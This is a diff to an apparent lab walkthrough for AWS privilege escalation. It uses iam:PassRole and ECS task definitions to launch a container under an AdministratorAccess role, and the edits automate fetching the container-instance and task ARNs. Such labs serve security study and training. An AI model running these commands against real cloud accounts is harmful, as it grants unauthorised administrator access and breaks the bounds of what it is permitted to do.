@@ -33,6 +33,8 @@ aws ecs list-container-instances --cluster pl-prod-ecs-005-cluster
 # Returns: containerInstanceArns: ["arn:aws:ecs:<region>:<account_id>:container-instance/pl-prod-ecs-005-cluster/<id>"]
 ```
 
+If you get an empty list instead, the instance is still booting and its agent hasn't registered yet. Wait a few minutes and check again until you see it.
+
 Grab that ARN -- you'll need it in the exploitation step.
 
 You can also check what policies are currently attached to your user to confirm the baseline state:
@@ -72,19 +74,22 @@ aws ecs register-task-definition \
   }]'
 ```
 
-This call succeeds because you have `iam:PassRole` on the target role and `ecs:RegisterTaskDefinition` on `*`. Note the revision number returned -- you'll use it next.
+This call succeeds because you have `iam:PassRole` on the target role and `ecs:RegisterTaskDefinition` on `*`.
 
 ### Step 2: Start the task on the EC2 container instance
 
-With the task definition registered, use `ecs:StartTask` to launch it on the container instance you found during recon:
+With the task definition registered, use `ecs:StartTask` to launch it on the container instance you found during recon. Note: if the instance was recently booted, the ECS agent may take a few minutes to register it with the cluster, and this block will fail with `InvalidParameterException` (`instanceId length should be one of [32,36]`) because `CONTAINER_INSTANCE_ARN` holds `None`. Wait a couple of minutes and run the block again:
 
 ```bash
-CONTAINER_INSTANCE_ARN="arn:aws:ecs:<region>:<account_id>:container-instance/pl-prod-ecs-005-cluster/<id>"
-
-aws ecs start-task \
+CONTAINER_INSTANCE_ARN=$(aws ecs list-container-instances \
   --cluster pl-prod-ecs-005-cluster \
-  --task-definition pl-ecs-005-admin-escalation:1 \
-  --container-instances "$CONTAINER_INSTANCE_ARN"
+  --query 'containerInstanceArns[0]' --output text)
+
+TASK_ARN=$(aws ecs start-task \
+  --cluster pl-prod-ecs-005-cluster \
+  --task-definition pl-ecs-005-admin-escalation \
+  --container-instances "$CONTAINER_INSTANCE_ARN" \
+  --query 'tasks[0].taskArn' --output text)
 ```
 
 The task launches and the ECS agent on the EC2 instance pulls the `amazon/aws-cli` image and executes the command. The container runs with temporary credentials vended by the EC2 instance's IMDS on behalf of the task role -- in this case `pl-prod-ecs-005-to-admin-target-role`, which has `AdministratorAccess`.
@@ -94,8 +99,6 @@ The task launches and the ECS agent on the EC2 instance pulls the `amazon/aws-cl
 The task is ephemeral and typically finishes in 30--60 seconds. You can poll its status:
 
 ```bash
-TASK_ARN="<task_arn_from_start-task_output>"
-
 aws ecs describe-tasks \
   --cluster pl-prod-ecs-005-cluster \
   --tasks "$TASK_ARN" \
